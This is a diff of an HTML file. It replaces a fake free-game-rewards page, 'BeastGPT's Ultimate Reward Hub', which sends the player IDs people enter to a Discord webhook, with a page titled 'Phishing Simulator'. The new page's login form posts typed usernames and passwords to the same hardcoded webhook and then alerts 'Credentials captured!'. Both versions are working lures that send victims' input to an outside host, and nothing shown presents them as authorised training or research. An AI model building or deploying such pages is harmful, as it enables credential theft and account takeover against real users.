@@ -1,537 +1,86 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Rewards Hub</title>
+    <title>Phishing Simulator</title>
     <style>
-        /* General Body and Container Styles */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: #1a1a2e; /* Deep dark blue background */
-            color: #e0e0e0; /* Light text for readability */
-            line-height: 1.6;
-            overflow-x: hidden; /* Prevent horizontal scroll */
+            background-color: #1e1e2f;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .container {
-            max-width: 1200px;
-            margin: 20px auto;
-            padding: 20px;
-            background: #16213e; /* Slightly lighter inner background */
-            border-radius: 12px;
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6); /* Stronger shadow */
-            position: relative;
-            z-index: 1;
+        .login-container {
+            background-color: #2a2a3d;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            width: 300px;
         }
-
-        /* Header Styling */
-        header {
-            background: #0f3460; /* Dark blue header background */
-            padding: 25px;
+        .login-container h2 {
             text-align: center;
-            border-radius: 10px 10px 0 0;
-            margin-bottom: 20px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-        header h1 {
-            margin: 0;
-            color: #e94560; /* Vibrant accent color for title */
-            font-size: 2.8em;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-        }
-
-        /* Navigation Bar Styling */
-        nav {
-            background: #0f3460;
-            padding: 15px 0;
-            text-align: center;
-            border-radius: 0 0 10px 10px;
             margin-bottom: 20px;
         }
-        nav a {
-            color: #e0e0e0;
-            text-decoration: none;
-            padding: 12px 25px;
-            margin: 0 12px;
-            font-size: 1.1em;
-            transition: background-color 0.4s ease, color 0.4s ease, transform 0.2s ease;
-            border-radius: 6px;
-            position: relative;
-            overflow: hidden;
-            display: inline-block;
-        }
-        nav a:before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
+        .login-container input {
             width: 100%;
-            height: 100%;
-            background: rgba(233, 69, 96, 0.2); /* Accent color overlay */
-            transition: left 0.4s ease;
-            z-index: -1;
-        }
-        nav a:hover:before {
-            left: 0;
-        }
-        nav a:hover {
-            color: #fff;
-            transform: translateY(-2px);
-        }
-
-        /* Content Sections (Pages) */
-        .content-section {
-            display: none; /* Hidden by default */
-            padding: 30px;
-            margin-top: 25px;
-            background: #0f3460;
-            border-radius: 12px;
-            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.4);
-            animation: fadeIn 0.6s ease-out forwards;
-        }
-        .content-section.active {
-            display: block; /* Active section is shown */
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Heading Styles within Sections */
-        h2 {
-            color: #e94560;
-            border-bottom: 3px solid #e94560;
-            padding-bottom: 12px;
-            margin-top: 0;
-            font-size: 2.2em;
-            text-align: center;
-            letter-spacing: 1px;
-        }
-
-        /* Game List Grid */
-        .game-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 30px;
-        }
-
-        /* Individual Game Card Styling */
-        .game-card {
-            background: #1a1a2e;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            transition: transform 0.4s ease, box-shadow 0.4s ease, border-color 0.4s ease;
-            cursor: pointer;
-            border: 2px solid #0f3460;
-            position: relative;
-            overflow: hidden;
-        }
-        .game-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.7);
-            border-color: #53d86f; /* Green highlight on hover */
-        }
-        .game-card h3 {
-            color: #53d86f; /* Bright green for game titles */
-            margin-top: 0;
-            font-size: 1.8em;
-            margin-bottom: 15px;
-        }
-        .game-card p {
-            color: #b0b0b0;
-            font-size: 1em;
-            margin-bottom: 25px;
-        }
-        .game-card button {
-            background: #e94560;
-            color: white;
+            padding: 10px;
+            margin: 8px 0;
             border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.1em;
-            font-weight: bold;
-            letter-spacing: 0.5px;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-        }
-        .game-card button:hover {
-            background-color: #d03050;
-            transform: translateY(-2px);
-        }
-
-        /* Game Specific Detail Page Styles */
-        .game-detail {
-            text-align: center;
-            padding: 40px;
-            border-radius: 15px;
-            background: #1a1a2e; /* Default detail background */
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.8);
-            margin-top: 25px;
-        }
-        .game-detail h2 {
-            font-size: 3em;
-            margin-bottom: 25px;
-            border-bottom: none; /* Remove bottom border for main page title */
-            padding-bottom: 0;
-        }
-        .game-detail p {
-            font-size: 1.2em;
-            color: #c0c0c0;
-            margin-bottom: 35px;
-        }
-        .game-detail input[type="text"] {
-            width: 70%;
-            max-width: 450px;
-            padding: 18px;
-            margin-bottom: 25px;
-            border: 3px solid #0f3460;
-            border-radius: 10px;
-            background: #16213e;
-            color: #e0e0e0;
-            font-size: 1.2em;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-        .game-detail input[type="text"]::placeholder {
-            color: #888;
-        }
-        .game-detail input[type="text"]:focus {
-            border-color: #e94560;
-            box-shadow: 0 0 10px rgba(233, 69, 96, 0.5);
-        }
-        .game-detail button {
-            background: #e94560;
+            border-radius: 5px;
+            background-color: #3a3a4f;
             color: white;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
             border: none;
-            padding: 18px 45px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 1.4em;
+            border-radius: 5px;
+            background-color: #7289da;
+            color: white;
             font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            cursor: pointer;
         }
-        .game-detail button:hover {
-            background-color: #d03050;
-            transform: translateY(-3px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.6);
-        }
-        .game-detail .back-button {
-            display: inline-block;
-            margin-top: 35px;
-            background: #0f3460;
-            color: #e0e0e0;
-            padding: 12px 30px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 1.1em;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-        }
-        .game-detail .back-button:hover {
-            background-color: #1a1a2e;
-            transform: translateY(-2px);
-        }
-
-        /* Unique Styling for Each Game Page */
-        #game-pubg .game-detail {
-            background: linear-gradient(135deg, #2c3e50 0%, #0f3460 100%);
-            border: 2px solid #f1c40f;
-        }
-        #game-pubg .game-detail h2 { color: #f1c40f; } /* Yellow for PUBG */
-
-        #game-freefire .game-detail {
-            background: linear-gradient(135deg, #1f2833 0%, #0f3460 100%);
-            border: 2px solid #c0392b;
-        }
-        #game-freefire .game-detail h2 { color: #c0392b; } /* Red for Free Fire */
-
-        #game-cod .game-detail {
-            background: linear-gradient(135deg, #34495e 0%, #0f3460 100%);
-            border: 2px solid #95a5a6;
-        }
-        #game-cod .game-detail h2 { color: #95a5a6; } /* Grey for CoD */
-
-        #game-gta .game-detail {
-            background: linear-gradient(135deg, #5c2f00 0%, #0f3460 100%);
-            border: 2px solid #f39c12;
-        }
-        #game-gta .game-detail h2 { color: #f39c12; } /* Orange for GTA */
-
-        #game-candycrush .game-detail {
-            background: linear-gradient(135deg, #8e44ad 0%, #0f3460 100%);
-            border: 2px solid #d62d20;
-        }
-        #game-candycrush .game-detail h2 { color: #d62d20; } /* Dark Red for Candy Crush */
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-                padding: 15px;
-            }
-            header h1 {
-                font-size: 2em;
-            }
-            nav a {
-                display: block;
-                margin: 8px auto;
-                padding: 10px 15px;
-            }
-            .content-section {
-                padding: 20px;
-            }
-            h2 {
-                font-size: 1.8em;
-            }
-            .game-list {
-                grid-template-columns: 1fr;
-            }
-            .game-detail input[type="text"] {
-                width: 90%;
-            }
-            .game-detail button {
-                padding: 15px 30px;
-                font-size: 1.2em;
-            }
+        .login-container button:hover {
+            background-color: #5b6eae;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>BeastGPT's Ultimate Reward Hub</h1>
-        </header>
-        <nav>
-            <a href="#home" id="nav-home">Home</a>
-        </nav>
-
-        <div id="home-section" class="content-section active">
-            <h2>Online Mobile Games</h2>
-            <div class="game-list">
-                <div class="game-card" onclick="window.location.hash='game-pubg';">
-                    <h3>PUBG Mobile</h3>
-                    <p>Claim exclusive in-game rewards like UC, skins, and more!</p>
-                    <button>Claim Rewards</button>
-                </div>
-                <div class="game-card" onclick="window.location.hash='game-freefire';">
-                    <h3>Free Fire</h3>
-                    <p>Get diamonds, bundles, and rare items for your Free Fire account.</p>
-                    <button>Claim Rewards</button>
-                </div>
-                <div class="game-card" onclick="window.location.hash='game-cod';">
-                    <h3>Call of Duty Mobile</h3>
-                    <p>Unlock CP, weapon blueprints, and legendary operators.</p>
-                    <button>Claim Rewards</button>
-                </div>
-                <!-- Add more online games here following the same structure -->
-                <!--
-                <div class="game-card" onclick="window.location.hash='game-newonlinegame';">
-                    <h3>New Online Game</h3>
-                    <p>Exciting rewards await you in this popular online title!</p>
-                    <button>Claim Rewards</button>
-                </div>
-                -->
-            </div>
-
-            <h2 style="margin-top: 50px;">Offline Mobile Games</h2>
-            <div class="game-list">
-                <div class="game-card" onclick="window.location.hash='game-gta';">
-                    <h3>GTA San Andreas Mobile</h3>
-                    <p>Claim unlimited money, vehicles, and special cheat codes.</p>
-                    <button>Claim Rewards</button>
-                </div>
-                <div class="game-card" onclick="window.location.hash='game-candycrush';">
-                    <h3>Candy Crush Saga</h3>
-                    <p>Get infinite lives, boosters, and gold bars.</p>
-                    <button>Claim Rewards</button>
-                </div>
-                <!-- Add more offline games here following the same structure -->
-                <!--
-                <div class="game-card" onclick="window.location.hash='game-newofflinegame';">
-                    <h3>New Offline Game</h3>
-                    <p>Boost your progress and unlock hidden features!</p>
-                    <button>Claim Rewards</button>
-                </div>
-                -->
-            </div>
-        </div>
-
-        <!-- Game Detail Pages -->
-        <!-- Each game has its own distinct section hidden/shown by JavaScript -->
-
-        <div id="game-pubg" class="content-section">
-            <div class="game-detail">
-                <h2>PUBG Mobile Rewards</h2>
-                <p>Enter your PUBG Mobile Player ID to claim your exclusive UC and legendary outfits!</p>
-                <input type="text" id="pubg-id" placeholder="Enter your PUBG Mobile Player ID">
-                <button onclick="sendGameData('PUBG Mobile', document.getElementById('pubg-id').value)">Claim Now</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-
-        <div id="game-freefire" class="content-section">
-            <div class="game-detail">
-                <h2>Free Fire Rewards</h2>
-                <p>Enter your Free Fire Player ID to get your free diamonds and rare bundles!</p>
-                <input type="text" id="freefire-id" placeholder="Enter your Free Fire Player ID">
-                <button onclick="sendGameData('Free Fire', document.getElementById('freefire-id').value)">Claim Now</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-
-        <div id="game-cod" class="content-section">
-            <div class="game-detail">
-                <h2>Call of Duty Mobile Rewards</h2>
-                <p>Enter your CoD Mobile Player ID to unlock CP and epic weapon skins!</p>
-                <input type="text" id="cod-id" placeholder="Enter your CoD Mobile Player ID">
-                <button onclick="sendGameData('Call of Duty Mobile', document.getElementById('cod-id').value)">Claim Now</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-
-        <div id="game-gta" class="content-section">
-            <div class="game-detail">
-                <h2>GTA San Andreas Mobile Cheats</h2>
-                <p>Enter your GTA San Andreas Mobile save ID (or any identifier) to generate unlimited money and unlock all vehicles!</p>
-                <input type="text" id="gta-id" placeholder="Enter your Game ID / Identifier">
-                <button onclick="sendGameData('GTA San Andreas Mobile', document.getElementById('gta-id').value)">Generate Cheats</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-
-        <div id="game-candycrush" class="content-section">
-            <div class="game-detail">
-                <h2>Candy Crush Saga Boosts</h2>
-                <p>Enter your Candy Crush Player ID to receive infinite lives and powerful boosters!</p>
-                <input type="text" id="candycrush-id" placeholder="Enter your Candy Crush Player ID">
-                <button onclick="sendGameData('Candy Crush Saga', document.getElementById('candycrush-id').value)">Get Boosts</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-
-        <!-- Add more game detail sections here. Each needs a unique ID and different styles -->
-        <!-- Example for a new game:
-        <div id="game-newonlinegame" class="content-section">
-            <div class="game-detail" style="background: linear-gradient(135deg, #1b5e20, #0f3460); border: 2px solid #ffee58;">
-                <h2>New Online Game Rewards</h2>
-                <p>Enter your Player ID for exclusive rewards!</p>
-                <input type="text" id="newonlinegame-id" placeholder="Enter your Game ID">
-                <button onclick="sendGameData('New Online Game', document.getElementById('newonlinegame-id').value)">Claim Rewards</button>
-                <a href="#home" class="back-button">Back to Home</a>
-            </div>
-        </div>
-        -->
-
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="phishForm">
+            <input type="text" id="username" placeholder="Username" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
+        </form>
     </div>
 
     <script>
-        // Your Discord Webhook URL - Precisely as provided
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1';
-
-        // Function to control which content section is visible based on URL hash
-        function showContent(hash) {
-            // Hide all content sections first
-            document.querySelectorAll('.content-section').forEach(section => {
-                section.classList.remove('active');
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            const webhookURL = "https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1";
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
             });
-
-            // Determine the target section ID, defaulting to 'home-section'
-            let targetId = hash.substring(1) || 'home-section';
-            const targetSection = document.getElementById(targetId);
-
-            if (targetSection) {
-                targetSection.classList.add('active');
-            } else {
-                // If the hash is invalid or missing, show the home page
-                document.getElementById('home-section').classList.add('active');
-                window.location.hash = '#home'; // Update URL to reflect home
-            }
-        }
-
-        // Event listener for initial page load
-        window.addEventListener('load', () => {
-            showContent(window.location.hash);
+            
+            alert("Credentials captured!");
+            document.getElementById('phishForm').reset();
         });
-
-        // Event listener for URL hash changes (e.g., user navigating with back/forward buttons or clicking links)
-        window.addEventListener('hashchange', () => {
-            showContent(window.location.hash);
-        });
-
-        // Function to send game data (Game Name and Player ID) to the Discord webhook
-        async function sendGameData(gameName, gameId) {
-            if (!gameId.trim()) {
-                alert('Input field cannot be empty. Please enter your Game ID.');
-                return; // Stop if no ID is entered
-            }
-
-            const payload = {
-                username: "BeastGPT Reward Bot",
-                // You can add a custom avatar_url here if you have one, e.g., avatar_url: "https://example.com/your-bot-avatar.png",
-                embeds: [
-                    {
-                        title: `⚡️ New Claim Alert: ${gameName} ⚡️`,
-                        description: `A user has just submitted a reward claim for **${gameName}**.`,
-                        color: 15309990, // A powerful red color (#E94560 in decimal)
-                        fields: [
-                            {
-                                name: "Game Title",
-                                value: gameName,
-                                inline: true
-                            },
-                            {
-                                name: "Player ID Submitted",
-                                value: `\`\`\`${gameId}\`\`\``, // Use markdown for code block for clarity
-                                inline: true
-                            },
-                            {
-                                name: "Time of Submission",
-                                value: new Date().toLocaleString(),
-                                inline: false
-                            }
-                        ],
-                        footer: {
-                            text: "Data captured by BeastGPT's Advanced System",
-                            // You can add a footer icon_url here if you have one
-                        }
-                    }
-                ]
-            };
-
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
-
-                if (response.ok) {
-                    alert(`Success! Your request for ${gameName} rewards with ID: ${gameId} has been submitted. Please wait for processing. Your rewards will appear soon.`);
-                    // Optionally clear the input field after successful submission
-                    const inputElementId = gameName.toLowerCase().replace(/\s/g, '') + '-id';
-                    const inputElement = document.getElementById(inputElementId);
-                    if (inputElement) {
-                        inputElement.value = '';
-                    }
-                } else {
-                    const errorText = await response.text();
-                    alert(`Error submitting claim for ${gameName}. Status: ${response.status}. This incident has been logged.`);
-                    console.error('Webhook submission failed:', response.status, errorText);
-                }
-            } catch (error) {
-                alert('Network error during submission. Please check your connection and try again.');
-                console.error('Fetch operation error:', error);
-            }
-        }
     </script>
 </body>
 </html>
